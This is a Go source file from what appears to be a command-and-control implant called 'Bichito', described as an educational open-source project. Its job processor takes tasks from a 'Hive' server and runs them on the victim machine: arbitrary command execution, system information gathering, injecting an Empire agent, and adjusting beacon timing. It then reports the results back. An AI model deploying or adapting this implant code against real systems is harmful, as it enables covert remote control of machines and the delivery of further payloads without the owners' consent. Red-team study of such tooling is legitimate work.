//{{{{{{{ Bichito Jobs Functions }}}}}}}

//// Functions related to how implant process/handle received jobs
// A. jobprocessor

//By Rebujacker - Alvaro Folgado Rueda as an open source educative project
package main

import (
	"bichito/modules/biterpreter"
	"time"
	"strconv"
)



// Process Implant Jobs to be executed in Bot Machine
// A. Define a timeout to finish the Jobs and don't let the Implant hanging
// B. If jobs to process by implant is empty just create a ping job to the Hive
// C. Update the Job with output of executed commands

func jobProcessor(){

	//Lock shared Slice
	jobsToProcess.mux.Lock()
	defer jobsToProcess.mux.Unlock()

	if len(jobsToProcess.Jobs) == 0 {
		ping := Job{"","","",bid,"BiPing","","","",""}
		jobsToHive.mux.Lock()
		defer jobsToHive.mux.Unlock()
		jobsToHive.Jobs = append(jobsToHive.Jobs,&ping)
		return
	}

	contChannel := make(chan string, 1)
	biJobTimeout := time.NewTimer(time.Duration(10) * time.Second)
	var result,timeR string
	var error bool
	
	for i,job := range jobsToProcess.Jobs{

		go func() {
		  	
		   	switch job.Job{
		   		
		   		case "exec":
		   			error,result = biterpreter.Exec(job.Parameters)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		case "respTime":

		   			i, err := strconv.Atoi(job.Parameters)
		   			if err != nil{
						result = "Error Converting resptime string to int:"+ err.Error()
					}

					resptime = i
		   			ttl = ttl + resptime
		   			result = "RespTime changed to "+job.Parameters+" seconds"
		   			contChannel <- "continue"
		   		
		   		case "ttl":

		   			i, err := strconv.Atoi(job.Parameters)
		   			if err != nil{
						result = "Error Converting ttl string to int:"+ err.Error()
					}

					ttl = i
		   			result = "TTL changed to "+job.Parameters+" seconds"
		   			contChannel <- "continue"

		   		case "sysinfo":

		   			error,result = biterpreter.Sysinfo()
		   			if error{
						result = "Error Getting System Info:"+result
					}
		   			contChannel <- "continue"
		   		case "injectEmpire":

		   			//error,result = biterpreter.InjectEmpire(job.Parameters)
		   			error,result = biterpreter.InjectEmpire(job.Parameters)
		   			if error{
						result = "Error Injecting Empire:"+ result
					}
		   			contChannel <- "continue"
		   		default:
		   			result = "Void No Job Inplemented"
		   			contChannel <- "continue"		
		   	}

	
		}()

		select{
			case <- contChannel:
						
		   			timeR = time.Now().Format("02/01/2006 15:04:05 MST")
					job.Result = result
					job.Status = "Success"
					job.Time = timeR

					jobsToHive.mux.Lock()
		   			jobsToHive.Jobs = append(jobsToHive.Jobs,job)
		   			jobsToHive.mux.Unlock()

			case <- biJobTimeout.C:

					timeR = time.Now().Format("02/01/2006 15:04:05 MST")
					job.Result = "Job Timeout"
					job.Status = "Error"
					job.Time = timeR

					jobsToHive.mux.Lock()
		   			jobsToHive.Jobs = append(jobsToHive.Jobs,job)
		   			jobsToProcess.Jobs = jobsToProcess.Jobs[i+1:]
		   			jobsToHive.mux.Unlock()
		   			return
		}

	}

	//Clean all processed jobs
	jobsToProcess.Jobs = jobsToProcess.Jobs[:0]
	return
}
